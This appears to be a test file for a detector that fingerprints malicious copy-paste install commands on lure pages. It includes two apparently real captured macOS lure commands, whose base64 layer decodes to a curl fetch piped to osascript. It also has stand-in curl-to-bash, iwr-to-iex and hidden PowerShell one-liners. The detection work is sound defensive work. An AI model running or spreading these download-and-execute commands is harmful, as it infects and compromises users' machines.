import { describe, expect, test } from "bun:test";

import { deliveryCommand, deliveryCommandsOf } from "./delivery";

const MACMORROW = `echo "https://apps.apple.com/app/macmorrow-install"; echo 'Y3VybCAtc2ZMIGh0dHBzOi8va2V5Y2hhaW5hZ2VudC5wcm8vd2tzeGdqL3lYMWZRV0ZHdzlycCB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' | base64 -d | zsh`;
const MACSLATE = `echo "https://apps.apple.com/app/macslate-install"; echo 'Y3VybCAtc2ZMIGh0dHBzOi8vbm9kZWFnZW50LnByby9la2dzN3EvdmpKbEVXT1RnSlhxIHwgb3Nhc2NyaXB0IC1sIEphdmFTY3JpcHQ=' | base64 -d | zsh`;
const encode = (command: string) => Buffer.from(command).toString("base64");
const only = (page: string) => {
	const commands = deliveryCommandsOf(page);
	expect(commands).toHaveLength(1);
	return commands[0]!;
};

describe("delivery command fingerprint", () => {
	test("the App Store lure of macmorrow.app and macslate.app has one fingerprint although host, path and app name rotate (production campaigns 381039143620186610 and 382162112861967223)", () => {
		const a = only(`Open Terminal and paste:\n${MACMORROW}Copy command\nThen press Enter`);
		const b = only(MACSLATE);
		expect(a.value).toBe(b.value);
		expect(a.links).toBe(true);
		expect(b.links).toBe(true);
		expect(a.template).toBe(`echo "<url>"; echo '<base64>' | base64 -d | zsh\ncurl -sfL <url> | osascript -l JavaScript`);
		expect(a.interpreters).toEqual(["curl", "osascript"]);
		expect(a.shown).toBe(MACMORROW);
	});

	test("a different inner command is a different fingerprint: other pipe target, other flags, other interpreter flag case", () => {
		const base = only(MACMORROW).value;
		const variant = (inner: string, outer = "zsh") => only(`echo "https://apps.apple.com/app/x"; echo '${encode(inner)}' | base64 -d | ${outer}`).value;
		expect(variant("curl -sfL https://a.example/p/aaaaaaaa | osascript -l JavaScript")).toBe(base);
		expect(variant("curl -sfL https://a.example/p/aaaaaaaa | bash")).not.toBe(base);
		expect(variant("curl -fsSL https://a.example/p/aaaaaaaa | osascript -l JavaScript")).not.toBe(base);
		expect(variant("curl -sfL https://a.example/p/aaaaaaaa | osascript -l javascript")).not.toBe(base);
		expect(variant("curl -sfL https://a.example/p/aaaaaaaa | osascript -l JavaScript", "bash")).not.toBe(base);
	});

	test("the decoy's wording and whitespace do not matter, the command's structure does", () => {
		const inner = encode("curl -sfL https://a.example/p/aaaaaaaa | osascript -l JavaScript");
		const a = only(`echo "Installing   Foo App…"; echo '${inner}' | base64 -d | zsh`);
		const b = only(`echo "Installing Bar"; echo '${inner}' | base64 -d | zsh`);
		expect(a.value).toBe(b.value);
		expect(a.links).toBe(true);
		expect(only(`echo "x"; echo '${inner}' | base64 -d | bash`).value).not.toBe(a.value);
	});

	test("a bare one-liner is recorded but never links", () => {
		for (const line of ["curl -fsSL https://x.example/y | bash", "iwr https://x.example/y | iex", "curl -fsSL https://x.example/y | sh"]) {
			expect(only(line).links).toBe(false);
		}
		expect(only("curl -fsSL https://a.example/y | bash").value).toBe(only("curl -fsSL https://b.example/z/w | bash").value);
		expect(only("curl -fsSL https://x.example/y | bash").value).not.toBe(only("curl -fsSL https://x.example/y | sh").value);
	});

	test("an encoded layer, a decoy, or several statements make a command link", () => {
		expect(only(`echo '${encode("curl -fsSL https://x.example/y | bash")}' | base64 -d | bash`).links).toBe(true);
		expect(only("echo 'Installing…'; curl -fsSL https://x.example/y | bash").links).toBe(true);
		expect(only("cd /tmp && curl -fsSL https://x.example/y | bash").links).toBe(true);
		expect(only("powershell -w hidden -e " + Buffer.from("iwr https://x.example/y | iex", "utf16le").toString("base64")).links).toBe(true);
	});

	test("a URL with a semicolon-free query does not count as a second statement; prose is no command", () => {
		expect(only("curl -fsSL 'https://x.example/y?a=1;b=2' | bash").links).toBe(false);
		expect(deliveryCommandsOf("Use curl to download files from the internet.")).toEqual([]);
	});

	test("every command of a page gets its own fingerprint", () => {
		const page = `macOS:\n${MACMORROW}\nWindows:\npowershell -w hidden -e ${Buffer.from("iwr https://x.example/y | iex", "utf16le").toString("base64")}`;
		const commands = deliveryCommandsOf(page);
		expect(commands).toHaveLength(2);
		expect(new Set(commands.map((command) => command.value)).size).toBe(2);
		expect(deliveryCommand({ shown: "x", layers: [{ encoding: "plain", text: "curl https://a.example | sh" }], interpreters: ["sh"], payloadUrls: [], decoys: [] }).links).toBe(false);
	});
});
